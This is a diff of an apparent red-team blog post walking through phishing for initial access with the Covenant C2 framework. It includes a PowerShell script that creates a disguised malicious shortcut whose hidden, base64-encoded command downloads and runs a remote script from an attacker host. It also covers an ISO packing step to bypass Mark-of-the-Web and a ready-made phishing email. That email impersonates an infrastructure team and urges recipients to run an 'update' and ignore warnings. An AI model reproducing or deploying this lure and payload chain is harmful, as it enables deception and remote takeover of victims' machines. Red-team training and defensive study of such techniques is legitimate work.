@@ -235,9 +235,11 @@ I had initially used the encoded launcher in the target but the command was too 
 
 ![image](/posts/2023-03-25_red_team01/images/covenant28.png)
 
-- I selected this `C:\Program Files\Windows Defender\MpCmdRun.exe` as my icon file and it appears as shown
+- I selected this `C:\Program Files\Windows Defender\MpCmdRun.exe` and my icon file and it appears as shown
 
 ![image](/posts/2023-03-25_red_team01/images/covenant29.png)
+
+- Our malicious lnk looks a bit convincing right?
 
 - The following is a quicker alternative to creating the lnk file. Run the powershell script to generate the malicious lnk
 
@@ -256,11 +258,32 @@ $link.iconlocation = "C:\Program Files\Windows Defender\MpCmdRun.exe"
 $link.arguments = "-Nop -sta -noni -w hidden -encodedCommand  aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMAAwAC4ANwAyADoAOQAwADAAMAAvAHIAZQB2AC4AcABzADEAJwApAA=="
 $link.save()
 ```
-- You can proceed to bundle into an iso to perform an MOTW bypass and use a pretext to send the phishing email
-- Running the lnk file will give you a grunt on Covenant
+### Packing the lnk 
+
+- We can use packmyload to perform an MOTW bypass and create an iso file that contains the lnk
+
+![image](/posts/2023-03-25_red_team01/images/covenant30.png)
+
+### Pretexting
+I used the following pretext
+
+```markdown
+Good Morning,
+
+The Infrastructure Team has recently identified a critical security vulnerability in our system and are now rolling out a patch to fix it.
+
+As part of this process, you will be required to download the following Security Update, double click and run the updater. Ignore any warnings
+
+We apologize for any inconvenience caused but rest assured that these measures have been taken to protect you from potential threats. Thank you!
+```
+
+![image](/posts/2023-03-25_red_team01/images/covenant31.png)
+
+- Download the iso file and execute the lnk file to get a grunt
 
 
 ## Conclusion
 
 - We have looked into some of the common phishing techniques used during initial access. Although all of them would obviously trigger most security defenses, these are just standard procedures to generate and conduct phishing campaigns. 
+- All of the discussed initial access methods can be done with whatever C2 you choose and also different file formats like HTA files.
 - In future blogs, we can look into how to generate more covert and complex phishing campaigns that can bypass modern EDRs
